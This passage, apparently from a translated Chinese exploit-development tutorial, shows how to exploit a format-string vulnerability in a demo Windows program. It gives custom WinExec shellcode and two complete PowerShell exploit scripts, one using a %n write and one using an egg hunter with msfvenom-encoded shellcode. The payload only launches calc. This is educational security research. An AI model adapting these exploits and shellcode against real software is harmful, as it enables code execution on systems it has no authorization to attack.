现在ECX已经指向了19f758，这正是我们要写入shellcode的位置。
由于我们有80个A字符，我将先尝试写入我自己的shellcode来弹出calc。因为如果我再次增加A字符的数量，计算偏移量时就会很麻烦。我将使用WinExec
API来调用calc,让我们找到它的地址。
下面是我自己编写的一个简单的asm代码,用来调用WinExec API。
    format PE GUI 4.0
    entry ShellCode
    include 'win32ax.inc'
    ; Author: @OsandaMalith
    section '.code' executable readable writeable 
    ShellCode:
      push ebp
      mov ebp, esp
      xor edi, edi
      push edi
      mov byte  [ebp-04h], 'c'
      mov byte  [ebp-03h], 'a'
      mov byte  [ebp-02h], 'l'
      mov byte  [ebp-01h], 'c'
      mov dword [esp+4], edi
      mov byte  [ebp-08h], 01h
      lea eax, [ebp-04h]
      push eax
      mov eax, 75263640h  
      call eax
下面是我最终的exp:
    $shellcode = [Byte[]] @(
    0x55, # push ebp  
    0x89, 0xE5,   # mov ebp, esp 
    0x31, 0xFF,   # xor edi, edi  
    0x57, # push edi
    0xC6, 0x45, 0xFC, 0x63,   # mov byte  [ebp-04h], 'c' 
    0xC6, 0x45, 0xFD, 0x61,   # mov byte  [ebp-03h], 'a'
    0xC6, 0x45, 0xFE, 0x6C,   # mov byte  [ebp-02h], 'l'  
    0xC6, 0x45, 0xFF, 0x63,   # mov byte  [ebp-01h], 'c'
    0x89, 0x7C, 0x24, 0x04,   # mov dword [esp+4], edi 
    0xC6, 0x45, 0xF8, 0x01,   # mov byte  [ebp-08h], 01h 
    0x8D, 0x45, 0xFC, # lea eax,  [ebp-04h] 
    0x50, # push eax
    0xB8, 0x40, 0x36, 0x26, 0x75, # mov eax, 75263640h
    0xFF, 0xD0# call eax
    )
    $shellcode += [Byte[]] (0x41) * (80 - $shellcode.Length)
    $fmt = ([system.Text.Encoding]::ASCII).GetBytes('%x' * 51)   + 
       ([system.Text.Encoding]::ASCII).GetBytes('%.425430x' * 3) + 
       ([system.Text.Encoding]::ASCII).GetBytes('%.424942x') +
       ([system.Text.Encoding]::ASCII).GetBytes('%n')  
    $ret = [System.BitConverter]::GetBytes(0x0019f730)
    $final = $shellcode + $fmt + $ret
    $payload = ''
    ForEach ($i in $final) { 
     $payload += ([system.Text.Encoding]::Default).GetChars($i)
    }
    Start-Process ./fmt.exe -ArgumentList $payload
让我们在调试器中进行最后的检查。
ECX的值0019f758将被移至指向EAX的指针,其值为0019f730，这是一个包含我们返回地址的堆栈指针。在ECX寄存器内部,它指向我们的shellcode。
当触发函数返回时，EIP将指向我们的shellcode。
一旦我们运行这个exp,就能得到计算器。
您觉得使用egg hunter来查找shellcode的方式怎么样呢？有人可能会反驳说我们可以使用一个long
jump，或者我们可以直接将shellcode放在开头。但由于我的兴趣和好奇心,我仍然想使用这个方式。
一开始,我检查了bad chars,并在这个程序找到了它:“\x00\x09\x20” 。下面是egg
hunter的exp。请注意，偏移量可能会在不同的Windows平台上发生变化。
    [Byte[]] $egg = 0x66,0x81,0xca,0xff,0x0f,0x42,0x52,0x6a,0x02,0x58,0xcd,0x2e,0x3c,0x05,0x5a,0x74,0xef,0xb8,0x54,0x30,0x30,0x57,0x8b,0xfa,0xaf,0x75,0xea,0xaf,0x75,0xe7,0xff,0xe7
    $shellcode = ([system.Text.Encoding]::ASCII).GetBytes('W00TW00T')
    #msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f powershell -e x86/alpha_mixed
    [Byte[]] $shellcode += 0x89,0xe0,0xdd,0xc7,0xd9,0x70,0xf4,0x5a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x43,0x43,0x43,0x43,0x43,0x43,0x37,0x52,0x59,0x6a,0x41,0x58,0x50,0x30,0x41,0x30,0x41,0x6b,0x41,0x41,0x51,0x32,0x41,0x42,0x32,0x42,0x42,0x30,0x42,0x42,0x41,0x42,0x58,0x50,0x38,0x41,0x42,0x75,0x4a,0x49,0x49,0x6c,0x78,0x68,0x4c,0x42,0x55,0x50,0x73,0x30,0x33,0x30,0x61,0x70,0x6c,0x49,0x6b,0x55,0x56,0x51,0x4b,0x70,0x73,0x54,0x6c,0x4b,0x56,0x30,0x56,0x50,0x6c,0x4b,0x32,0x72,0x76,0x6c,0x4e,0x6b,0x71,0x42,0x57,0x64,0x4e,0x6b,0x73,0x42,0x34,0x68,0x44,0x4f,0x48,0x37,0x53,0x7a,0x74,0x66,0x34,0x71,0x39,0x6f,0x4c,0x6c,0x45,0x6c,0x43,0x51,0x73,0x4c,0x76,0x62,0x44,0x6c,0x65,0x70,0x6b,0x71,0x38,0x4f,0x64,0x4d,0x37,0x71,0x7a,0x67,0x59,0x72,0x68,0x72,0x43,0x62,0x42,0x77,0x4e,0x6b,0x50,0x52,0x32,0x30,0x4e,0x6b,0x72,0x6a,0x77,0x4c,0x6e,0x6b,0x52,0x6c,0x57,0x61,0x73,0x48,0x78,0x63,0x72,0x68,0x33,0x31,0x38,0x51,0x30,0x51,0x6e,0x6b,0x70,0x59,0x75,0x70,0x55,0x51,0x4e,0x33,0x6c,0x4b,0x73,0x79,0x46,0x78,0x7a,0x43,0x45,0x6a,0x62,0x69,0x4c,0x4b,0x65,0x64,0x6c,0x4b,0x75,0x51,0x38,0x56,0x50,0x31,0x59,0x6f,0x4c,0x6c,0x59,0x51,0x6a,0x6f,0x76,0x6d,0x63,0x31,0x48,0x47,0x44,0x78,0x4d,0x30,0x42,0x55,0x4c,0x36,0x65,0x53,0x31,0x6d,0x58,0x78,0x55,0x6b,0x31,0x6d,0x71,0x34,0x31,0x65,0x6a,0x44,0x61,0x48,0x6e,0x6b,0x32,0x78,0x51,0x34,0x55,0x51,0x6a,0x73,0x71,0x76,0x6c,0x4b,0x44,0x4c,0x70,0x4b,0x4e,0x6b,0x53,0x68,0x57,0x6c,0x73,0x31,0x49,0x43,0x4e,0x6b,0x74,0x44,0x6e,0x6b,0x76,0x61,0x78,0x50,0x4c,0x49,0x30,0x44,0x76,0x44,0x66,0x44,0x73,0x6b,0x43,0x6b,0x61,0x71,0x53,0x69,0x32,0x7a,0x72,0x71,0x79,0x6f,0x6d,0x30,0x43,0x6f,0x63,0x6f,0x72,0x7a,0x6e,0x6b,0x74,0x52,0x7a,0x4b,0x4e,0x6d,0x31,0x4d,0x43,0x5a,0x55,0x51,0x6e,0x6d,0x4f,0x75,0x38,0x32,0x75,0x50,0x55,0x50,0x65,0x50,0x30,0x50,0x71,0x78,0x65,0x61,0x6c,0x4b,0x52,0x4f,0x6d,0x57,0x79,0x6f,0x4a,0x75,0x4f,0x4b,0x4a,0x50,0x4d,0x65,0x49,0x32,0x73,0x66,0x71,0x78,0x6f,0x56,0x6d,0x45,0x6f,0x4d,0x6f,0x6d,0x39,0x6f,0x4b,0x65,0x75,0x6c,0x45,0x56,0x51,0x6c,0x64,0x4a,0x4d,0x50,0x4b,0x4b,0x79,0x70,0x31,0x65,0x37,0x75,0x4d,0x6b,0x71,0x57,0x76,0x73,0x62,0x52,0x52,0x4f,0x71,0x7a,0x63,0x30,0x62,0x73,0x49,0x6f,0x69,0x45,0x53,0x53,0x51,0x71,0x50,0x6c,0x33,0x53,0x36,0x4e,0x53,0x55,0x70,0x78,0x32,0x45,0x45,0x50,0x41,0x41
    $egg += [Byte[]] (0x41) * (80 - $egg.Length)
    $fmt = ([system.Text.Encoding]::ASCII).GetBytes('%x' * 305)  + 
       ([system.Text.Encoding]::ASCII).GetBytes('%.425430x' * 3) + 
       ([system.Text.Encoding]::ASCII).GetBytes('%.424942x') +
       ([system.Text.Encoding]::ASCII).GetBytes('%n')  
    $ret = [System.BitConverter]::GetBytes(0x0019f730)
    $final = $egg + $fmt + $shellcode + $ret
    $payload = ''
    ForEach ($i in $final) { 
     $payload += ([system.Text.Encoding]::Default).GetChars($i)
    }
    Start-Process ./fmt.exe -ArgumentList $payload
这种开发方法依赖于编译器。我已经在Embarcadero C ++（Borland C ++）和Visual C ++
2000编译器上进行过实验了。在其他编译器中，printf函数与这些函数有些差异。你也可以研究其他编译器的开发方法。